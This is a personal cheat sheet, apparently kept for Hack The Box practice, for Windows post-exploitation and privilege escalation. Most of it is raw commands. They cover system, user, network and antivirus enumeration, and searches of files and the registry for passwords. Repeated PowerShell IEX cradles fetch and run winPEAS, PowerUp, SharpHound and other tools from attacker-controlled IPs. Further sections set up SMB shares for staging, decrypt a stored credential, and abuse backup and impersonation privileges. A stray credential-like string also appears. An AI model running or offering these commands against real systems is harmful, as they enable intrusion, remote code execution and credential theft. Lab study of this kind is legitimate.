
>[! bug] Hidden Files Powershell
>
```
dir -force
```


```
#System Enuemration
shell
hostname
systeminfo 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe 
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic logicaldisk 
wmic logicaldisk get caption,description,providername 
wmic logicaldisk get caption

```

```
#User Enumeration
whoami
whoami /priv
whoami /groups

net user
net user <username>
net localgroup
net localgroup <groupname>
```

```
#Network Enumeration
ipconfig
ipconfig /all

arp -a
route print

netstat -ano
```

```
#AV Enumeration
sc query windefend
sc queryex type= service 

netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

```
HassHass
._;k4n?F61:y
```

# System info
```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type"
```


# List patches
```
wmic qfe
```
 
# List installed applications
```
wmic product get name,version
```
 
# Get disks
```
wmic logicaldisk get caption,description
```
 
# User enumeration
```
whoami /priv
```

```
whoami /groups
```

```
net users
```

```
net localgroup
```
 
# Network enumeration
```
ipconfig
```

```
route print
```

```
arp -a
```
 
# Finding passwords
```
findstr /si password *.txt *.ini *.config
```

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```
 
# Services
```
sc query | findstr /B /C:"SERVICE_NAME" /C:"DISPLAY_NAME"
```
 
# Firewall Configuration
```
netsh advfirewall firewall dump
```

```
netsh firewall show state
```

```
netsh firewall show config
```



## Winpeas
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
```
cd /usr/share/windows-resources/
```

```
Invoke-WebRequest -Uri http://10.10.16.6/Auto/winPEASx64.exe -OutFile winpeas.exe
```

```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe'); Invoke-winPEASx64 -Extended
```

```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe') | powershell -noprofile -
```

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1')
```

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
```



## Priv
https://github.com/itm4n/PrivescCheck
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
```

## Powerup
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/PowerUp.ps1') | powershell -noprofile -
```


## SharpHound.ps1
```
IWR -Uri http://10.10.16.20/SharpHound.ps1 -OutFile SharpHound.ps1
```
or
```
IEX (New-Object Net.Webclient).downloadstring("http://10.10.16.20/SharpHound.ps1")
```

Not able to run the Bloodhound from the sharp hound function will see what mistake i am doing . Refer the PDF once to see how they have run the bloodhound.
```
Invoke-BloodHound -CollectionMethod All
```

```
net use z: \\10.10.16.20\share
impacket-smbserver share $(pwd)
```



## Sherlock
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/Sherlock.ps1') | powershell -noprofile -
```

## Jaws
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/jaws-enum.ps1') | powershell -noprofile -
```


## Write Files
We need to run winpeas somewhere so will find locations like this work
```
C:\Windows\System32\spool\drivers\color
```

## IIS Server
```
Generally what we do when we are on a Web Server
We try to go into the www directory
cd \inetpub
cd wwwroot 

Cuz if we get a shell as IIS chances are we will be having SE Impersonate Privilege which will allow us to escalate.
```


## How to run the .exe file in kali linux
ILSpy is the **open-source .** **NET assembly browser and decompiler**

```
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
```

```
unzip Linux.x64.Release.zip
```

```
unzip ILSpy-linux-x64-Release.zip
```

```
./ILSpy
```

![[Pasted image 20240917081516.png]]


## Privileges net user ______

I’m particularly interesting in backup and restore. I can see that jorden has `SeBackupPrivilege` and `SeRestorePrivilege`.

#### File Read

With both of these privs, I can use `robocopy` to read files (see [PayloadsAllTheThings short reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)).



## Scripts

- [ ] winpeas  https://github.com/carlospolop/PEASS-ng/releases/tag/20221211




## Setting up a SMB-share to run Winpeas
I was not able to run Winpeas earlier but after seeing the video they have taught a way to do that. We have to make a smb share with user and password so let's give it a try for myself and see what happens.

```
impacket-smbserver Hackthebox $(pwd) -smb2support -user testing -password testing
```


## Get a NEW PSDrive 

So to do that we have to put the user and password in Credential Object.
```
$pass = convertto-securestring 'testing' -AsPlainText -Force 
```

```
$cred= New-Object System.Management.Automation.PSCredential('testing', $pass)
```

```
New-PSDrive -Name testing -PSProvider FileSystem -Credential $cred -Root \\10.10.16.8\Hackthebox
```

```
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```


## Impacket
```
impacket-smbserver Toolkit $(pwd)
```



## Decrypt 
There is cred.xml file where the password is encrypted we have to find a way to decrypt it.

```
$pass = "Encrypted_Password" | convertto-securestring
```

```
$user = "HTB\Tom"
```

```
$cred = New-Object System.Management.Automation.PSCredential($user,$pass)
```

```
$cred.GetNetworkCredential() | fl
```



# Lolbins
We have to use LOLbins
https://lolbas-project.github.io/

